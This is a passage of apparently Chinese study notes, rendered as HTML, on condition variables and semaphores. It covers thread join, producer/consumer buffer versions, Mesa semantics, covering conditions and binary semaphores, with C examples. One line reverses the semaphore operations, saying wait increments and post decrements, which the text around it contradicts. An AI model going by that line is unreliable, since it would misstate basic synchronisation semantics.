class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">int</span> done = <span class="hljs-number">0</span>;<br><span class="hljs-number">2</span> <span class="hljs-type">pthread_mutex_t</span> m = PTHREAD_MUTEX_INITIALIZER;<br><span class="hljs-number">3</span> <span class="hljs-type">pthread_cond_t</span> c = PTHREAD_COND_INITIALIZER;<br><span class="hljs-number">4</span><br><span class="hljs-number">5</span> <span class="hljs-type">void</span> <span class="hljs-title function_">thr_exit</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">6</span> Pthread_mutex_lock(&amp;m);<br><span class="hljs-number">7</span> done = <span class="hljs-number">1</span>;<br><span class="hljs-number">8</span> Pthread_cond_signal(&amp;c);<br><span class="hljs-number">9</span> Pthread_mutex_unlock(&amp;m);<br><span class="hljs-number">10</span> &#125;<br><span class="hljs-number">11</span><br><span class="hljs-number">12</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">child</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">13</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child\n&quot;</span>);<br><span class="hljs-number">14</span> thr_exit();<br><span class="hljs-number">15</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">16</span> &#125; <br><span class="hljs-number">17</span><br><span class="hljs-number">18</span> <span class="hljs-type">void</span> <span class="hljs-title function_">thr_join</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">19</span> Pthread_mutex_lock(&amp;m);<br><span class="hljs-number">20</span> <span class="hljs-keyword">while</span> (done == <span class="hljs-number">0</span>)<br><span class="hljs-number">21</span> Pthread_cond_wait(&amp;c, &amp;m);<br><span class="hljs-number">22</span> Pthread_mutex_unlock(&amp;m);<br><span class="hljs-number">23</span> &#125;<br><span class="hljs-number">24</span><br><span class="hljs-number">25</span> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br><span class="hljs-number">26</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent: begin\n&quot;</span>);<br><span class="hljs-number">27</span> <span class="hljs-type">pthread_t</span> p;<br><span class="hljs-number">28</span> Pthread_create(&amp;p, <span class="hljs-literal">NULL</span>, child, <span class="hljs-literal">NULL</span>);<br><span class="hljs-number">29</span> thr_join();<br><span class="hljs-number">30</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent: end\n&quot;</span>);<br><span class="hljs-number">31</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">32</span> &#125; <br></code></pre></td></tr></table></figure><p>有两种情况需要考虑。第一种情况是父线程创建出子线程，但<strong>自己继续运行</strong>（假设只有一个处理器），然后马上调用 thr_join()等待子线程。在这种情况下，它会先获取锁，检查子进程是否完成（还没有完成），然后调用 wait()，让自己休眠。子线程最终得以运行，打印出“child”，并调用 thr_exit()函数唤醒父进程，这段代码会在获得锁后设置状态变量 done，然后向父线程发信号唤醒它。最后，父线程会运行（从 wait()调用返回并持有锁），释放锁，打印出“parent:end”。</p><p>第二种情况是，子线程在创建后，立刻运行，设置变量 done 为 1，调用 signal 函数唤醒其他线程（这里没有其他线程），然后结束。父线程运行后，调用 thr_join()时，发现 done 已经是 1 了，就直接返回。</p><p>最后一点说明：你可能看到父线程<strong>使用了一个 while 循环</strong>，而不是 if 语句来判断是否需要等待。虽然从逻辑上来说没有必要使用循环语句，但这样做总是好的</p><p><strong>如果没有变量 done：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">void</span> <span class="hljs-title function_">thr_exit</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">2</span> Pthread_mutex_lock(&amp;m);<br><span class="hljs-number">3</span> Pthread_cond_signal(&amp;c);<br><span class="hljs-number">4</span> Pthread_mutex_unlock(&amp;m);<br><span class="hljs-number">5</span> &#125;<br><span class="hljs-number">6</span><br><span class="hljs-number">7</span> <span class="hljs-type">void</span> <span class="hljs-title function_">thr_join</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">8</span> Pthread_mutex_lock(&amp;m);<br><span class="hljs-number">9</span> Pthread_cond_wait(&amp;c, &amp;m);<br><span class="hljs-number">10</span> Pthread_mutex_unlock(&amp;m);<br><span class="hljs-number">11</span> &#125;<br></code></pre></td></tr></table></figure><p>这段代码是有问题的。假设子线程立刻运行，并且调用 thr_exit()。在这种情况下，子 线程发送信号，但此时却没有在条件变量上睡眠等待的线程。父线程运行时，就会<strong>调用 wait 并卡在那里</strong>，没有其他线程会唤醒它。通过这个例子，你应该认识到变量 done 的重要性， 它记录了线程有兴趣知道的值。睡眠、唤醒和锁都离不开它。</p><p><strong>如果没有锁：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">void</span> <span class="hljs-title function_">thr_exit</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">2</span> done = <span class="hljs-number">1</span>;<br><span class="hljs-number">3</span> Pthread_cond_signal(&amp;c);<br><span class="hljs-number">4</span> &#125;<br><span class="hljs-number">5</span><br><span class="hljs-number">6</span> <span class="hljs-type">void</span> <span class="hljs-title function_">thr_join</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">7</span> <span class="hljs-keyword">if</span> (done == <span class="hljs-number">0</span>)<br><span class="hljs-number">8</span> Pthread_cond_wait(&amp;c);<br><span class="hljs-number">9</span> &#125;<br></code></pre></td></tr></table></figure><p>这里的问题是一个微妙的竞态条件。具体来说，如果父进程调用 thr_join()，然后检查完 done 的值为 0，然后试图睡眠。但在调用 wait 进入睡眠之前，父进程被中断。子线程修改变量 done 为 1，发出信号，同样没有等待线程。父线程再次运行时，就会长眠不醒，这就惨了。</p><h2 id="消费者-生产者（有界缓冲区）问题"><a href="#消费者-生产者（有界缓冲区）问题" class="headerlink" title="消费者/生产者（有界缓冲区）问题"></a>消费者/生产者（有界缓冲区）问题</h2><h3 id="第一版：唤醒后，运行前，缓冲区状态改变。"><a href="#第一版：唤醒后，运行前，缓冲区状态改变。" class="headerlink" title="第一版：唤醒后，运行前，缓冲区状态改变。"></a>第一版：唤醒后，运行前，缓冲区状态改变。</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">cond_t</span> cond;<br><span class="hljs-number">2</span> <span class="hljs-type">mutex_t</span> mutex;<br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">5</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">6</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">7</span> Pthread_mutex_lock(&amp;mutex); <span class="hljs-comment">// p1</span><br><span class="hljs-number">8</span> <span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>) <span class="hljs-comment">// p2</span><br><span class="hljs-number">9</span> Pthread_cond_wait(&amp;cond, &amp;mutex); <span class="hljs-comment">// p3</span><br><span class="hljs-number">10</span> put(i); <span class="hljs-comment">// p4</span><br><span class="hljs-number">11</span> Pthread_cond_signal(&amp;cond); <span class="hljs-comment">// p5</span><br><span class="hljs-number">12</span> Pthread_mutex_unlock(&amp;mutex); <span class="hljs-comment">// p6</span><br><span class="hljs-number">13</span> &#125;<br><span class="hljs-number">14</span> &#125;<br><span class="hljs-number">15</span><br><span class="hljs-number">16</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">17</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">18</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">19</span> Pthread_mutex_lock(&amp;mutex); <span class="hljs-comment">// c1</span><br><span class="hljs-number">20</span> <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>) <span class="hljs-comment">// c2</span><br><span class="hljs-number">21</span> Pthread_cond_wait(&amp;cond, &amp;mutex); <span class="hljs-comment">// c3</span><br><span class="hljs-number">22</span> <span class="hljs-type">int</span> tmp = get(); <span class="hljs-comment">// c4</span><br><span class="hljs-number">23</span> Pthread_cond_signal(&amp;cond); <span class="hljs-comment">// c5</span><br><span class="hljs-number">24</span> Pthread_mutex_unlock(&amp;mutex); <span class="hljs-comment">// c6</span><br><span class="hljs-number">25</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, tmp);<br><span class="hljs-number">26</span> &#125;<br><span class="hljs-number">27</span> &#125;<br></code></pre></td></tr></table></figure><p>我们来理解第一个问题，它与等待之前的 if 语句有关。假设有两个消费者（Tc1 和 Tc2）， 一个生产者（Tp）。首先，一个消费者（Tc1）先开始执行，它获得锁（c1），检查缓冲区是 否可以消费（c2），然后等待（c3）（这会释放锁）。</p><p>接着生产者（Tp）运行。它获取锁（p1），检查缓冲区是否满（p2），发现没满就给缓冲 区加入一个数字（p4）。然后生产者发出信号，说缓冲区已满（p5）。关键的是，这让第一 个消费者（Tc1）不再睡在条件变量上，进入就绪队列。Tc1 现在可以运行（但还未运行）。 生产者继续执行，直到发现缓冲区满后睡眠（p6,p1-p3）。</p><p>这时问题发生了：<strong>另一个消费者（Tc2）抢先执行</strong>，消费了缓冲区中的值（c1,c2,c4,c5,c6， 跳过了 c3 的等待，因为缓冲区是满的）。现在假设 Tc1 运行，在从 wait 返回之前，它获取了锁，然后返回。然后它调用了 get() (p4)，但缓冲区已无法消费！断言触发，代码不能像预 期那样工作。</p><p><strong>Mesa语义</strong>：</p><p>发信号给线程只是唤醒它们，暗示状态发生了变化（在这个例子中，就是值 已被放入缓冲区），但并<strong>不会保证</strong>在它运行之前状态一直是期望的情况。</p><h3 id="第二版：使用-while-代替-if"><a href="#第二版：使用-while-代替-if" class="headerlink" title="第二版：使用 while 代替 if"></a>第二版：使用 while 代替 if</h3><p>把 if 语句改为 while。当消费者 Tc1 被唤 醒后，立刻再次检查共享变量（c2）。如果缓冲区此时为空，消费者就会回去继续睡眠（c3）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">cond_t</span> cond;<br><span class="hljs-number">2</span> <span class="hljs-type">mutex_t</span> mutex;<br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">5</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">6</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">7</span> Pthread_mutex_lock(&amp;mutex); <span class="hljs-comment">// p1</span><br><span class="hljs-number">8</span> <span class="hljs-keyword">while</span> (count == <span class="hljs-number">1</span>) <span class="hljs-comment">// p2</span><br><span class="hljs-number">9</span> Pthread_cond_wait(&amp;cond, &amp;mutex); <span class="hljs-comment">// p3</span><br><span class="hljs-number">10</span> put(i); <span class="hljs-comment">// p4</span><br><span class="hljs-number">11</span> Pthread_cond_signal(&amp;cond); <span class="hljs-comment">// p5</span><br><span class="hljs-number">12</span> Pthread_mutex_unlock(&amp;mutex); <span class="hljs-comment">// p6</span><br><span class="hljs-number">13</span> &#125;<br><span class="hljs-number">14</span> &#125;<br><span class="hljs-number">15</span><br><span class="hljs-number">16</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">17</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">18</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">19</span> Pthread_mutex_lock(&amp;mutex); <span class="hljs-comment">// c1</span><br><span class="hljs-number">20</span> <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>) <span class="hljs-comment">// c2</span><br><span class="hljs-number">21</span> Pthread_cond_wait(&amp;cond, &amp;mutex); <span class="hljs-comment">// c3</span><br><span class="hljs-number">22</span> <span class="hljs-type">int</span> tmp = get(); <span class="hljs-comment">// c4</span><br><span class="hljs-number">23</span> Pthread_cond_signal(&amp;cond); <span class="hljs-comment">// c5</span><br><span class="hljs-number">24</span> Pthread_mutex_unlock(&amp;mutex); <span class="hljs-comment">// c6</span><br><span class="hljs-number">25</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, tmp);<br><span class="hljs-number">26</span> &#125;<br><span class="hljs-number">27</span> &#125; <br></code></pre></td></tr></table></figure><p>由于 Mesa 语义，我们要记住一条关于条件变量的简单规则：<strong>总是使用 while 循环（always use while loop）</strong>。虽然有时候不需要重新检查条件，但这样做总是安全的，做了就开心了。</p><p>还有的问题是：</p><p>使用两个条件变量，而不是一个，以便正确地发出信号，在系统 状态改变时，哪类线程应该唤醒。</p><p>假设两个消费者（Tc1 和 Tc2）先运行，都睡眠了（c3）。 生产者开始运行，在缓冲区放入一个值，唤醒了一个消费者（假定是 Tc1），并开始睡眠。现 在是一个消费者马上要运行（Tc1），两个线程（Tc2 和 Tp）都等待在同一个条件变量上。问题马上就要出现了：让人感到兴奋！ 消费者 Tc1 醒过来并从 wait()调用返回（c3），重新检查条件（c2），发现缓冲区是满的， 消费了这个值（c4）。这个消费者然后在该条件上发信号（c5），唤醒一个在睡眠的线程。但 是，<strong>应该唤醒哪个线程呢</strong>？ 因为消费者已经清空了缓冲区，很显然，<strong>应该唤醒生产者</strong>。但是，<strong>如果它唤醒了 Tc2</strong>（这 绝对是可能的，取决于等待队列是如何管理的），问题就出现了。具体来说，消费者 Tc2 会醒过来，发现队列为空（c2），又继续回去睡眠（c3）。生产者 Tp 刚才在缓冲区中放了一个值，现在在睡眠。另一个消费者线程 Tc1 也回去睡眠了。3 个线程都在睡眠，显然是一个缺陷。由表 30.2 可以看到这个可怕灾难的步骤。</p><h3 id="第三版：两个条件变量"><a href="#第三版：两个条件变量" class="headerlink" title="第三版：两个条件变量"></a>第三版：两个条件变量</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">cond_t</span> empty, fill;<br><span class="hljs-number">2</span> <span class="hljs-type">mutex_t</span> mutex;<br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">5</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">6</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">7</span> Pthread_mutex_lock(&amp;mutex);<br><span class="hljs-number">8</span> <span class="hljs-keyword">while</span> (count == <span class="hljs-number">1</span>)<br><span class="hljs-number">9</span> Pthread_cond_wait(&amp;empty, &amp;mutex);<br><span class="hljs-number">10</span> put(i);<br><span class="hljs-number">11</span> Pthread_cond_signal(&amp;fill);<br><span class="hljs-number">12</span> Pthread_mutex_unlock(&amp;mutex);<br><span class="hljs-number">13</span> &#125;<br><span class="hljs-number">14</span> &#125;<br><span class="hljs-number">15</span><br><span class="hljs-number">16</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">17</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">18</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">19</span> Pthread_mutex_lock(&amp;mutex);<br><span class="hljs-number">20</span> <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>)<br><span class="hljs-number">21</span> Pthread_cond_wait(&amp;fill, &amp;mutex);<br><span class="hljs-number">22</span> <span class="hljs-type">int</span> tmp = get();<br><span class="hljs-number">23</span> Pthread_cond_signal(&amp;empty);<br><span class="hljs-number">24</span> Pthread_mutex_unlock(&amp;mutex);<br><span class="hljs-number">25</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, tmp);<br><span class="hljs-number">26</span> &#125;<br><span class="hljs-number">27</span> &#125;<br></code></pre></td></tr></table></figure><p>在上述代码中，生产者线程等待条件变量 empty，发信号给变量 fill。相应地，消费者 线程等待 fill，发信号给 empty。这样做，从设计上避免了上述第二个问题：消费者再也不 会唤醒消费者，生产者也不会唤醒生产者。</p><h3 id="最终方案"><a href="#最终方案" class="headerlink" title="最终方案"></a>最终方案</h3><p>我们现在有了可用的生产者/消费者方案，但不太通用。我们最后的修改是提高并发和 效率。具体来说，增加更多缓冲区槽位，这样在睡眠之前，可以生产多个值。同样，睡眠 之前可以消费多个值。单个生产者和消费者时，这种方案因为上下文切换少，提高了效率。 多个生产者和消费者时，它甚至支持并发生产和消费，从而提高了并发。幸运的是，和现 有方案相比，改动也很小。</p><p>第一处修改是缓冲区结构本身，以及对应的 put()和 get()方法（见图 30.9）。我们还稍稍 修改了生产者和消费者的检查条件，以便决定是否要睡眠。图 30.10 展示了最终的等待和信 号逻辑。生产者只有在缓冲区满了的时候才会睡眠（p2），消费者也只有在队列为空的时候 睡眠（c2）。至此，我们解决了生产者/消费者问题。</p><p>最终的get和put方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">int</span> buffer[MAX];<br><span class="hljs-number">2</span> <span class="hljs-type">int</span> fill = <span class="hljs-number">0</span>;<br><span class="hljs-number">3</span> <span class="hljs-type">int</span> use = <span class="hljs-number">0</span>;<br><span class="hljs-number">4</span> <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-number">5</span><br><span class="hljs-number">6</span> <span class="hljs-type">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;<br><span class="hljs-number">7</span> buffer[fill] = value;<br><span class="hljs-number">8</span> fill = (fill + <span class="hljs-number">1</span>) % MAX;<br><span class="hljs-number">9</span> count++;<br><span class="hljs-number">10</span> &#125;<br><span class="hljs-number">11</span><br><span class="hljs-number">12</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">13</span> <span class="hljs-type">int</span> tmp = buffer[use];<br><span class="hljs-number">14</span> use = (use + <span class="hljs-number">1</span>) % MAX;<br><span class="hljs-number">15</span> count--;<br><span class="hljs-number">16</span> <span class="hljs-keyword">return</span> tmp;<br><span class="hljs-number">17</span> &#125; <br></code></pre></td></tr></table></figure><p>最终有效方案</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">cond_t</span> empty, fill;<br><span class="hljs-number">2</span> <span class="hljs-type">mutex_t</span> mutex;<br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">5</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">6</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">7</span> Pthread_mutex_lock(&amp;mutex); <span class="hljs-comment">// p1</span><br><span class="hljs-number">8</span> <span class="hljs-keyword">while</span> (count == MAX) <span class="hljs-comment">// p2</span><br><span class="hljs-number">9</span> Pthread_cond_wait(&amp;empty, &amp;mutex); <span class="hljs-comment">// p3</span><br><span class="hljs-number">10</span> put(i); <span class="hljs-comment">// p4</span><br><span class="hljs-number">11</span> Pthread_cond_signal(&amp;fill); <span class="hljs-comment">// p5</span><br><span class="hljs-number">12</span> Pthread_mutex_unlock(&amp;mutex); <span class="hljs-comment">// p6</span><br><span class="hljs-number">13</span> &#125;<br><span class="hljs-number">14</span> &#125;<br><span class="hljs-number">15</span><br><span class="hljs-number">16</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">17</span> <span class="hljs-type">int</span> i;<br><span class="hljs-number">18</span> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; loops; i++) &#123;<br><span class="hljs-number">19</span> Pthread_mutex_lock(&amp;mutex); <span class="hljs-comment">// c1</span><br><span class="hljs-number">20</span> <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>) <span class="hljs-comment">// c2</span><br><span class="hljs-number">21</span> Pthread_cond_wait(&amp;fill, &amp;mutex); <span class="hljs-comment">// c3</span><br><span class="hljs-number">22</span> <span class="hljs-type">int</span> tmp = get(); <span class="hljs-comment">// c4</span><br><span class="hljs-number">23</span> Pthread_cond_signal(&amp;empty); <span class="hljs-comment">// c5</span><br><span class="hljs-number">24</span> Pthread_mutex_unlock(&amp;mutex); <span class="hljs-comment">// c6</span><br><span class="hljs-number">25</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, tmp);<br><span class="hljs-number">26</span> &#125;<br><span class="hljs-number">27</span> &#125;<br></code></pre></td></tr></table></figure><h2 id="覆盖条件"><a href="#覆盖条件" class="headerlink" title="覆盖条件"></a>覆盖条件</h2><p>考虑以下场景。假设目前没有空闲内存，线程 Ta 调用 allocate(100)，接着线程 Tb 请求 较少的内存，调用 allocate(10)。Ta和 Tb 都等待在条件上并睡眠，没有足够的空闲内存来满 足它们的请求。 这时，假定第三个线程 Tc调用了 free(50)。遗憾的是，当它发信号唤醒等待线程时，可 能不会唤醒申请 10 字节的 Tb 线程。而 Ta 线程由于内存不够，仍然等待。<strong>因为不知道唤醒 哪个（或哪些）线程</strong>，所以图中代码无法正常工作。</p><p>Lampson 和 Redell 的解决方案也很直接：用 pthread_cond_broadcast()代替上述代码中的 pthread_cond_signal()，<strong>唤醒所有的等待线程</strong>。这样做，确保了所有应该唤醒的线程都被唤 醒。当然，不利的一面是可能会影响性能，因为不必要地唤醒了其他许多等待的线程，它 们本来（还）不应该被唤醒。这些线程被唤醒后，重新检查条件，马上再次睡眠。</p><p>Lampson 和 Redell 把这种条件变量叫作<strong>覆盖条件（covering condition）</strong>，因为它能覆盖所有需要唤醒线程的场景（保守策略）。</p><h1 id="第-31-章-信号量"><a href="#第-31-章-信号量" class="headerlink" title="第 31 章 信号量"></a>第 31 章 信号量</h1><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>信号量是有一个整数值的对象，可以用两个函数来操作它。在 POSIX 标准中，是 sem_wait()和 sem_post()①。因为信号量的初始值能够决定其行为，所以首先要初始化信号量， 才能调用其他函数与之交互</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-number">2</span> <span class="hljs-type">sem_t</span> s;<br><span class="hljs-number">3</span> sem_init(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>其中申明了一个信号量 s，<strong>通过第三个参数，将它的值初始化为 1</strong>。sem_init()的第二个 参数，在我们看到的所有例子中都设置为 0，表示信号量是在同一进程的多个线程共享的。 读者可以参考手册，了解信号量的其他用法（即如何用于跨不同进程的同步访问），这要求 第二个参数用不同的值。</p><p><strong>若信号量小于0，则等待</strong></p><p>wait会让信号量加一；</p><p>post会减一。</p><h2 id="二值信号量（锁）"><a href="#二值信号量（锁）" class="headerlink" title="二值信号量（锁）"></a>二值信号量（锁）</h2><p>我们直接把临界区用一对 sem_wait()/sem_post()环绕。但是，为 了使这段代码正常工作，信号量 m 的初始值（图中初始化为 X）是至关重要的。X 应该是多少呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">sem_t</span> m;<br><span class="hljs-number">2</span> sem_init(&amp;m, <span class="hljs-number">0</span>, X); <span class="hljs-comment">// initialize semaphore to X; what should X be?</span><br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> sem_wait(&amp;m);<br><span class="hljs-number">5</span> <span class="hljs-comment">// critical section here</span><br><span class="hljs-number">6</span> sem_post(&amp;m);<br></code></pre></td></tr></table></figure><p>回顾 sem_wait()和 sem_post()函数的定义，我们发现初值应该是 1。</p><ul><li><p>为了说明清楚，我们假设有两个线程的场景。第一个线程（线程 0）调用了 sem_wait()， 它把信号量的值减为 0。</p></li><li><p>然后，它只会在值小于 0 时等待。因为值是 0，调用线程从函数返 回并继续，线程 0 现在可以自由进入临界区。</p></li><li><p>线程 0 在临界区中，如果没有其他线程尝试 获取锁，当它调用 sem_post()时，会将信号量重置为 1（因为没有等待线程，不会唤醒其他 线程）。</p></li></ul><p>如果线程 0 持有锁（即调用了 sem_wait()之后，调用 sem_post()之前），另一个线程（线 程 1）调用 sem_wait()尝试进入临界区，那么更有趣的情况就发生了。这种情况下，<strong>线程 1 把信号量减为−1，然后等待（自己睡眠，放弃处理器）</strong>。线程 0 再次运行，<strong>它最终调用 sem_post()，将信号量的值增加到 0</strong>，<strong>唤醒</strong>等待的线程（线程 1），然后线程 1 就可以获取锁。 线程 1 执行结束时，再次增加信号量的值，将它恢复为 1。</p><h2 